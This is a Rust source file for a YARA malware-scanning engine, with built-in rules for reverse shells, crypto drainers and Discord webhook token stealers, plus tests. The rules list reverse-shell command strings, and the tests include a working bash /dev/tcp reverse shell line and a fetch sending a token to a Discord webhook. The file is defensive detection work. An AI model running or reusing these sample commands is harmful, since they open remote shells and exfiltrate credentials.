use crate::RuleMatch;
use std::path::Path;
use tracing::{info, warn};

pub const DEFAULT_YARA_RULES: &str = r#"
rule ReverseShellGeneric {
    meta:
        description = "Detects generic reverse shell commands (bash, nc, python)"
        severity = "critical"
    strings:
        $bash = "/bin/sh -i >& /dev/tcp/" ascii
        $bash2 = "/bin/bash -i >& /dev/tcp/" ascii
        $nc1 = "nc -e /bin/sh" ascii
        $nc2 = "nc -e /bin/bash" ascii
        $nc3 = "ncat -e /bin/sh" ascii
        $py = "pty.spawn(\"/bin/bash\")" ascii
        $py2 = "pty.spawn(\"/bin/sh\")" ascii
    condition:
        any of them
}

rule CryptoDrainerGeneric {
    meta:
        description = "Detects crypto wallet drainer and transaction manipulation signatures"
        severity = "high"
    strings:
        $drain1 = "drainAll" ascii nocase
        $drain2 = "drainToken" ascii nocase
        $permit = "signTypedData_v4" ascii
        $seaport = "0x00000000000000ADc04C56Bf30aC9d3c0aAF14bC" ascii
        $transfer_from = "transferFrom(address,address,uint256)" ascii
    condition:
        2 of them
}

rule DiscordWebhookStealer {
    meta:
        description = "Detects Discord webhook exfiltration pattern in scripts"
        severity = "critical"
    strings:
        $hook = "discord.com/api/webhooks/" ascii nocase
        $token = "token" ascii nocase
        $pass = "password" ascii nocase
    condition:
        $hook and ($token or $pass)
}
"#;

pub struct YaraEngine {
    rules: Option<yara_x::Rules>,
}

impl YaraEngine {
    /// Initialize YaraEngine with default built-in rules and optional directory of .yar files
    pub fn new(custom_rules_dir: Option<&Path>) -> Self {
        let mut compiler = yara_x::Compiler::new();

        // 1. Add default rules
        if let Err(e) = compiler.add_source(DEFAULT_YARA_RULES) {
            warn!("Failed to compile default YARA rules: {}", e);
        }

        // 2. Add custom rules from directory if provided
        if let Some(dir) = custom_rules_dir {
            if dir.is_dir() {
                Self::load_rules_from_dir(dir, &mut compiler);
            }
        }

        let rules = compiler.build();
        Self { rules: Some(rules) }
    }

    fn load_rules_from_dir(dir: &Path, compiler: &mut yara_x::Compiler) {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_file() {
                    let ext = path.extension().and_then(|s| s.to_str()).unwrap_or("");
                    if ext == "yar" || ext == "yara" {
                        if let Ok(source) = std::fs::read_to_string(&path) {
                            if let Err(e) = compiler.add_source(source.as_str()) {
                                warn!("Failed to compile YARA rule file {:?}: {}", path, e);
                            } else {
                                info!("Loaded custom YARA rule: {:?}", path);
                            }
                        }
                    }
                }
            }
        }
    }

    /// A scanner to reuse across files. Building one instantiates a wasm
    /// module, which used to happen once per scanned file.
    pub fn scanner(&self) -> Option<yara_x::Scanner<'_>> {
        self.rules.as_ref().map(yara_x::Scanner::new)
    }

    /// Scan a buffer/file data with YARA rules and return findings as RuleMatch
    #[cfg(test)]
    pub fn scan_data(&self, file_path: &str, data: &[u8]) -> Vec<RuleMatch> {
        self.scanner()
            .map(|mut s| scan_with(&mut s, file_path, data))
            .unwrap_or_default()
    }
}

/// Run `scanner` over `data`. Severity comes from the rule's
/// `meta: severity`; custom rules used to be forced to "medium".
pub fn scan_with(
    scanner: &mut yara_x::Scanner<'_>,
    file_path: &str,
    data: &[u8],
) -> Vec<RuleMatch> {
    let Ok(scan_results) = scanner.scan(data) else {
        return Vec::new();
    };
    scan_results
        .matching_rules()
        .map(|rule| {
            let rule_id = rule.identifier();
            let severity = rule
                .metadata()
                .find_map(|(key, value)| match value {
                    yara_x::MetaValue::String(s) if key == "severity" => Some(s.to_lowercase()),
                    _ => None,
                })
                .filter(|s| ["critical", "high", "medium", "low"].contains(&s.as_str()))
                .unwrap_or_else(|| "medium".to_string());
            RuleMatch {
                file_path: file_path.to_string(),
                line_number: 1,
                matched_pattern: format!("YARA Rule: {}", rule_id),
                severity,
                context: format!("Matched YARA rule {} in {}", rule_id, file_path),
            }
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_yara_reverse_shell_detection() {
        let engine = YaraEngine::new(None);
        let sample = b"import os\nos.system('/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')";
        let findings = engine.scan_data("exploit.py", sample);
        assert!(!findings.is_empty());
        assert!(findings
            .iter()
            .any(|f| f.matched_pattern.contains("ReverseShellGeneric")));
    }

    #[test]
    fn test_yara_discord_webhook_stealer() {
        let engine = YaraEngine::new(None);
        let sample = b"const url = 'https://discord.com/api/webhooks/123/xyz'; fetch(url, { body: JSON.stringify({ token: 'stolen' }) });";
        let findings = engine.scan_data("stealer.js", sample);
        assert!(!findings.is_empty());
        assert!(findings
            .iter()
            .any(|f| f.matched_pattern.contains("DiscordWebhookStealer")));
    }

    #[test]
    fn severity_comes_from_rule_meta_and_scanner_is_reusable() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("custom.yar"),
            "rule CustomDropper { meta: severity = \"critical\" strings: $a = \"evil-dropper\" condition: $a }\n\
             rule NoMeta { strings: $a = \"plain-marker\" condition: $a }",
        )
        .unwrap();
        let engine = YaraEngine::new(Some(dir.path()));
        let mut scanner = engine.scanner().unwrap();
        let first = scan_with(&mut scanner, "a.js", b"x evil-dropper y");
        let second = scan_with(&mut scanner, "b.js", b"plain-marker");
        assert_eq!(first[0].severity, "critical");
        assert_eq!(second[0].severity, "medium");
        assert_eq!(second[0].file_path, "b.js");
    }
}
